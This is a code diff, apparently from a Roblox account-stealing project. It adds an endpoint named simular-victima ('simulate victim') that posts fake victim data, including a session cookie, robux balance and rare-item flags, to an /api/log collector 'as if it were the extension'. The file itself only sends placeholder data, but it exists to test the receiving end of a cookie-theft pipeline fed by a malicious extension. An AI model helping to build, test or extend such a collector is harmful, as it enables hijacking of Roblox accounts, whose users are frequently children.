@@ -1,26 +1,49 @@
-// api/test-recibir.js
-export default function handler(req, res) {
+// api/simular-victima.js
+export default async function handler(req, res) {
     res.setHeader('Access-Control-Allow-Origin', '*');
-    res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
-    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
+    
+    // Datos de prueba como si fueran de una víctima
+    const datosPrueba = {
+        roblox: {
+            username: "Usuario_Test",
+            userId: "123456789",
+            robux: 1500,
+            seguidores: 800,
+            amigos: 200,
+            premium: "Sí",
+            verified: "Sí",
+            headless: "Sí",
+            korblox: "No"
+        },
+        cookie: "COOKIE_DE_PRUEBA_123456",
+        pais: "Argentina",
+        fecha: "10/03/2026",
+        hora: "15:30:22 De la Tarde",
+        userAgent: "Mozilla/5.0 (Test)"
+    };
 
-    if (req.method === 'OPTIONS') {
-        return res.status(204).end();
-    }
-
-    if (req.method === 'POST') {
-        return res.status(200).json({
-            recibido: true,
-            metodo: 'POST',
-            body: req.body,
-            headers: req.headers
+    // Enviar a log.js como si fuera la extensión
+    const baseUrl = `https://${req.headers.host}`;
+    
+    try {
+        const response = await fetch(`${baseUrl}/api/log`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(datosPrueba)
         });
-    }
 
-    if (req.method === 'GET') {
-        return res.status(200).json({
-            mensaje: 'Envía un POST para probar',
-            metodo: 'GET'
+        const resultado = await response.json();
+        
+        res.status(200).json({
+            mensaje: "✅ Simulación enviada a /api/log",
+            respuesta_log: resultado,
+            datos_enviados: datosPrueba
+        });
+        
+    } catch (error) {
+        res.status(500).json({
+            error: error.message,
+            mensaje: "❌ Falló al enviar a /api/log"
         });
     }
 }
